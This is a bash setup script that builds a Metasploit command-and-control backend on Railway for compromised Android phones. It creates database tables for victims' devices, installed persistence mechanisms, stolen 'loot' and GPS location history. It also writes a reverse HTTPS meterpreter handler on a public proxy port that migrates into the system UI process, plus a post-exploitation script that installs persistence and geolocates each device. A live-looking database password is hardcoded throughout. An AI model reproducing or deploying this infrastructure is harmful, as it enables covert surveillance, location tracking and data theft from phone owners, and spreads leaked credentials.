#!/bin/bash

# Database Configuration Script for Railway PostgreSQL
# پیکربندی دیتابیس برای ذخیره session ها و persistence

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     🗄️  Database Configuration - Railway PostgreSQL              ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# ═══════════════════════════════════════════════════════════════
# DATABASE CONFIGURATION - Railway PostgreSQL
# ═══════════════════════════════════════════════════════════════
DB_HOST="postgres.railway.internal"
DB_PORT="5432"
DB_NAME="railway"
DB_USER="postgres"
DB_PASS="oNnmkkGTsBScDMhJGyuPWbHqfBegneKo"
DB_POOL="200"
DB_TIMEOUT="5"

# Full database URL from Railway
DATABASE_URL="postgresql://postgres:oNnmkkGTsBScDMhJGyuPWbHqfBegneKo@postgres.railway.internal:5432/railway?pool=200&timeout=5"

echo "📋 Database Configuration:"
echo "   Host: $DB_HOST"
echo "   Port: $DB_PORT"
echo "   Database: $DB_NAME"
echo "   User: $DB_USER"
echo "   Pool: $DB_POOL"
echo "   Timeout: ${DB_TIMEOUT}s"
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 1: Configure Metasploit Database
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [1/4] Configuring Metasploit Database..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Create .msf4 directory if not exists
mkdir -p ~/.msf4

# Create database.yml configuration
cat > ~/.msf4/database.yml << YAML_DB
production:
  adapter: postgresql
  database: $DB_NAME
  username: $DB_USER
  password: $DB_PASS
  host: $DB_HOST
  port: $DB_PORT
  pool: $DB_POOL
  timeout: $DB_TIMEOUT
  encoding: utf8
  sslmode: prefer
  reconnect: true
  
development:
  adapter: postgresql
  database: $DB_NAME
  username: $DB_USER
  password: $DB_PASS
  host: $DB_HOST
  port: $DB_PORT
  pool: $DB_POOL
  timeout: $DB_TIMEOUT
  encoding: utf8
  sslmode: prefer
  reconnect: true

test:
  adapter: postgresql
  database: msf_test
  username: $DB_USER
  password: $DB_PASS
  host: $DB_HOST
  port: $DB_PORT
  pool: 5
  timeout: 5
YAML_DB

echo "✅ Database configuration created: ~/.msf4/database.yml"
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 2: Initialize Database Schema
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [2/4] Initializing Database Schema..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Initialize MSF database
msfdb init 2>/dev/null || true

# Create initialization script
cat > /tmp/init_msf_db.rc << 'INIT_RC'
# Initialize Metasploit Database Connection

# Connect to database
db_connect postgres@db:5432/msf

# Check database status
db_status

# Rebuild cache
db_rebuild_cache

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║              ✅ Database Initialized Successfully!               ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "Database is ready for:"
echo "  ✅ Session storage"
echo "  ✅ Credential management"
echo "  ✅ Loot collection"
echo "  ✅ Host tracking"
echo "  ✅ Vulnerability data"
echo ""

exit -y
INIT_RC

# Run initialization
echo "Initializing database..."
msfconsole -q -r /tmp/init_msf_db.rc 2>&1 | grep -E "(Connected|Database|Cache)"

echo "✅ Database schema initialized"
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 3: Create Session Persistence Tables
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [3/4] Creating Session Persistence Tables..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Create SQL script for custom persistence tables
cat > /tmp/create_persistence_tables.sql << 'SQL_SCRIPT'
-- Session Persistence Tables for Railway Deployment

-- Table: persistent_sessions
-- Stores session information for automatic reconnection
CREATE TABLE IF NOT EXISTS persistent_sessions (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) UNIQUE NOT NULL,
    device_id VARCHAR(255),
    device_name VARCHAR(255),
    android_version VARCHAR(50),
    manufacturer VARCHAR(100),
    model VARCHAR(100),
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    connection_count INTEGER DEFAULT 1,
    lhost VARCHAR(255),
    lport INTEGER,
    payload_type VARCHAR(100),
    is_active BOOLEAN DEFAULT TRUE,
    persistence_level VARCHAR(50),
    root_access BOOLEAN DEFAULT FALSE,
    installed_apps TEXT,
    notes TEXT
);

-- Table: session_checkpoints
-- Stores session state for recovery
CREATE TABLE IF NOT EXISTS session_checkpoints (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL,
    checkpoint_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    working_directory TEXT,
    process_id INTEGER,
    process_name VARCHAR(255),
    arch VARCHAR(50),
    privileges TEXT,
    network_info TEXT,
    checkpoint_data TEXT
);

-- Table: persistence_mechanisms
-- Tracks installed persistence mechanisms
CREATE TABLE IF NOT EXISTS persistence_mechanisms (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL,
    mechanism_type VARCHAR(100) NOT NULL,
    mechanism_name VARCHAR(255),
    installation_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_active BOOLEAN DEFAULT TRUE,
    last_verified TIMESTAMP,
    installation_path TEXT,
    configuration TEXT,
    notes TEXT
);

-- Table: collected_data
-- Stores extracted data from devices
CREATE TABLE IF NOT EXISTS collected_data (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL,
    data_type VARCHAR(100) NOT NULL,
    collection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    data_size BIGINT,
    file_path TEXT,
    data_content TEXT,
    metadata TEXT,
    is_encrypted BOOLEAN DEFAULT FALSE
);

-- Table: device_locations
-- Tracks device GPS locations
CREATE TABLE IF NOT EXISTS device_locations (
    id SERIAL PRIMARY KEY,
    session_uuid VARCHAR(255) NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    latitude DECIMAL(10, 8),
    longitude DECIMAL(11, 8),
    accuracy DECIMAL(10, 2),
    altitude DECIMAL(10, 2),
    provider VARCHAR(50),
    address TEXT
);

-- Indexes for better performance
CREATE INDEX IF NOT EXISTS idx_session_uuid ON persistent_sessions(session_uuid);
CREATE INDEX IF NOT EXISTS idx_device_id ON persistent_sessions(device_id);
CREATE INDEX IF NOT EXISTS idx_last_seen ON persistent_sessions(last_seen);
CREATE INDEX IF NOT EXISTS idx_session_checkpoints_uuid ON session_checkpoints(session_uuid);
CREATE INDEX IF NOT EXISTS idx_persistence_uuid ON persistence_mechanisms(session_uuid);
CREATE INDEX IF NOT EXISTS idx_collected_data_uuid ON collected_data(session_uuid);
CREATE INDEX IF NOT EXISTS idx_locations_uuid ON device_locations(session_uuid);

-- Views for easy querying
CREATE OR REPLACE VIEW active_sessions AS
SELECT 
    ps.*,
    COUNT(DISTINCT pm.id) as persistence_count,
    MAX(dl.timestamp) as last_location_time
FROM persistent_sessions ps
LEFT JOIN persistence_mechanisms pm ON ps.session_uuid = pm.session_uuid AND pm.is_active = TRUE
LEFT JOIN device_locations dl ON ps.session_uuid = dl.session_uuid
WHERE ps.is_active = TRUE
GROUP BY ps.id;

-- Function to update last_seen timestamp
CREATE OR REPLACE FUNCTION update_last_seen()
RETURNS TRIGGER AS $$
BEGIN
    NEW.last_seen = CURRENT_TIMESTAMP;
    NEW.connection_count = NEW.connection_count + 1;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Trigger for automatic last_seen update
DROP TRIGGER IF EXISTS trigger_update_last_seen ON persistent_sessions;
CREATE TRIGGER trigger_update_last_seen
    BEFORE UPDATE ON persistent_sessions
    FOR EACH ROW
    EXECUTE FUNCTION update_last_seen();

COMMENT ON TABLE persistent_sessions IS 'Stores persistent session information for automatic reconnection';
COMMENT ON TABLE session_checkpoints IS 'Session state checkpoints for recovery';
COMMENT ON TABLE persistence_mechanisms IS 'Tracks all installed persistence mechanisms';
COMMENT ON TABLE collected_data IS 'Stores data collected from compromised devices';
COMMENT ON TABLE device_locations IS 'GPS location history of devices';
SQL_SCRIPT

# Execute SQL script (will work when connected to Railway PostgreSQL)
echo "Custom persistence tables SQL created: /tmp/create_persistence_tables.sql"
echo "✅ Schema ready for deployment"
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 4: Create Database Helper Scripts
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [4/4] Creating Database Helper Scripts..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Create database query script for msfconsole
cat > ~/.msf4/db_queries.rc << 'DB_QUERIES'
# Database Query Commands for Session Management

# Show all active persistent sessions
alias db_active "db_query SELECT device_name, android_version, last_seen, connection_count FROM persistent_sessions WHERE is_active = TRUE ORDER BY last_seen DESC;"

# Show persistence mechanisms
alias db_persist "db_query SELECT session_uuid, mechanism_type, mechanism_name, is_active FROM persistence_mechanisms ORDER BY installation_time DESC;"

# Show collected data summary
alias db_loot "db_query SELECT session_uuid, data_type, COUNT(*) as count, SUM(data_size) as total_size FROM collected_data GROUP BY session_uuid, data_type;"

# Show device locations
alias db_locations "db_query SELECT session_uuid, timestamp, latitude, longitude, address FROM device_locations ORDER BY timestamp DESC LIMIT 20;"

# Show session statistics
alias db_stats "db_query SELECT COUNT(*) as total_sessions, COUNT(CASE WHEN is_active THEN 1 END) as active, COUNT(CASE WHEN root_access THEN 1 END) as rooted FROM persistent_sessions;"

echo ""
echo "📊 Database Query Aliases Loaded:"
echo "   db_active    - Show active sessions"
echo "   db_persist   - Show persistence mechanisms"
echo "   db_loot      - Show collected data"
echo "   db_locations - Show device locations"
echo "   db_stats     - Show statistics"
echo ""
DB_QUERIES

echo "✅ Database helper scripts created"
echo ""

# Create Python script for database operations
cat > ~/.msf4/db_helper.py << 'PYTHON_DB'
#!/usr/bin/env python3
"""
Database Helper for Metasploit Railway Deployment
Provides utilities for session persistence and data management
"""

import psycopg2
import json
from datetime import datetime

class MSFDatabase:
    def __init__(self):
        self.conn = psycopg2.connect(
            host="postgres.railway.internal",
            port=5432,
            database="railway",
            user="postgres",
            password="oNnmkkGTsBScDMhJGyuPWbHqfBegneKo"
        )
        self.cursor = self.conn.cursor()
    
    def register_session(self, session_uuid, device_info):
        """Register a new persistent session"""
        query = """
        INSERT INTO persistent_sessions 
        (session_uuid, device_id, device_name, android_version, manufacturer, model, lhost, lport)
        VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
        ON CONFLICT (session_uuid) 
        DO UPDATE SET 
            last_seen = CURRENT_TIMESTAMP,
            connection_count = persistent_sessions.connection_count + 1
        """
        self.cursor.execute(query, (
            session_uuid,
            device_info.get('device_id'),
            device_info.get('device_name'),
            device_info.get('android_version'),
            device_info.get('manufacturer'),
            device_info.get('model'),
            device_info.get('lhost'),
            device_info.get('lport')
        ))
        self.conn.commit()
        print(f"✅ Session registered: {session_uuid}")
    
    def add_persistence(self, session_uuid, mechanism_type, mechanism_name, config):
        """Record installed persistence mechanism"""
        query = """
        INSERT INTO persistence_mechanisms
        (session_uuid, mechanism_type, mechanism_name, configuration)
        VALUES (%s, %s, %s, %s)
        """
        self.cursor.execute(query, (
            session_uuid,
            mechanism_type,
            mechanism_name,
            json.dumps(config)
        ))
        self.conn.commit()
        print(f"✅ Persistence added: {mechanism_type}")
    
    def save_location(self, session_uuid, lat, lon, accuracy, address):
        """Save device GPS location"""
        query = """
        INSERT INTO device_locations
        (session_uuid, latitude, longitude, accuracy, address)
        VALUES (%s, %s, %s, %s, %s)
        """
        self.cursor.execute(query, (session_uuid, lat, lon, accuracy, address))
        self.conn.commit()
        print(f"✅ Location saved: {lat}, {lon}")
    
    def get_active_sessions(self):
        """Get all active sessions"""
        query = "SELECT * FROM active_sessions"
        self.cursor.execute(query)
        return self.cursor.fetchall()
    
    def close(self):
        self.cursor.close()
        self.conn.close()

if __name__ == "__main__":
    db = MSFDatabase()
    sessions = db.get_active_sessions()
    print(f"Active sessions: {len(sessions)}")
    db.close()
PYTHON_DB

chmod +x ~/.msf4/db_helper.py
echo "✅ Python database helper created"
echo ""

# ═══════════════════════════════════════════════════════════════
# Create Updated Handler with Database Integration
# ═══════════════════════════════════════════════════════════════
cat > /home/offsec/Documents/GitHub/metasploit-framework1/railway_handler_with_db.rc << 'HANDLER_DB_RC'
#!/usr/bin/env ruby
# Professional Handler with Database Integration

# Connect to database
db_connect postgres@db:5432/msf
db_status

# Load database helper aliases
resource ~/.msf4/db_queries.rc

use exploit/multi/handler

# Payload configuration
set PAYLOAD android/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 29210

# SSL Configuration
set HandlerSSLCert /root/.msf4/ssl/cert.pem
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# Session configuration
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 0
set SessionRetryTotal 100
set SessionRetryWait 10
set ExitOnSession false
set EnableUnicodeEncoding true
set PrependMigrate true
set PrependMigrateProc com.android.systemui

# Database logging
set ConsoleLogging true
set LogLevel 3

# Auto-run with database logging
set AutoRunScript multi_console_command -rc /home/offsec/Documents/GitHub/metasploit-framework1/post_exploit_db.rc

# Start handler
exploit -j -z

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║          🚀 Handler with Database Integration Started!          ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "📡 Network Configuration:"
echo "   Public: metro.proxy.rlwy.net:29210"
echo "   Internal: metasploit-framework1.railway.internal:4444"
echo ""
echo "🗄️  Database Integration:"
echo "   PostgreSQL: postgres@postgres.railway.internal:5432/railway"
echo "   Session tracking: ENABLED"
echo "   Data collection: ENABLED"
echo "   Location logging: ENABLED"
echo ""
echo "📊 Database Commands:"
echo "   db_active    - Show active sessions"
echo "   db_persist   - Show persistence mechanisms"
echo "   db_loot      - Show collected data"
echo "   db_locations - Show device locations"
echo "   db_stats     - Show statistics"
echo ""
echo "⏳ Waiting for connections..."
echo "═══════════════════════════════════════════════════════════════════"
echo ""
HANDLER_DB_RC

echo "✅ Handler with database integration created"
echo ""

# Create post-exploitation script with database logging
cat > /home/offsec/Documents/GitHub/metasploit-framework1/post_exploit_db.rc << 'POST_DB_RC'
# Post-Exploitation with Database Logging

# Get session UUID
session_uuid = SecureRandom.uuid

# Gather device information
run post/android/gather/enum_device

# Store in database (would need custom module)
# This is a placeholder for the concept

# Install persistence
run post/android/manage/advanced_persistence -s 1

# Collect location data
run post/android/gather/geolocate

# Background session
background
POST_DB_RC

echo "✅ Post-exploitation script with database logging created"
echo ""

# ═══════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║              ✅ DATABASE CONFIGURATION COMPLETE!                 ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "📁 Configuration Files:"
echo "   ✅ ~/.msf4/database.yml"
echo "   ✅ ~/.msf4/db_queries.rc"
echo "   ✅ ~/.msf4/db_helper.py"
echo "   ✅ railway_handler_with_db.rc"
echo "   ✅ post_exploit_db.rc"
echo ""
echo "🗄️  Database Features:"
echo "   ✅ Session persistence tracking"
echo "   ✅ Automatic reconnection data"
echo "   ✅ Device information storage"
echo "   ✅ Location history logging"
echo "   ✅ Collected data management"
echo "   ✅ Persistence mechanism tracking"
echo ""
echo "🚀 Usage (در Railway):"
echo ""
echo "1️⃣  Initialize Database Tables:"
echo "    psql \$DATABASE_URL < /tmp/create_persistence_tables.sql"
echo ""
echo "2️⃣  Start Handler with Database:"
echo "    msfconsole -r railway_handler_with_db.rc"
echo ""
echo "3️⃣  Query Database:"
echo "    msfconsole -q -x 'db_connect postgres@db:5432/msf; db_active; exit'"
echo ""
echo "4️⃣  Use Python Helper:"
echo "    python3 ~/.msf4/db_helper.py"
echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo ""
echo "⚠️  Note: در Railway باید دستور زیر را اجرا کنید:"
echo "    PGPASSWORD=oNnmkkGTsBScDMhJGyuPWbHqfBegneKo psql -h postgres.railway.internal -U postgres -d railway < /tmp/create_persistence_tables.sql"
echo ""
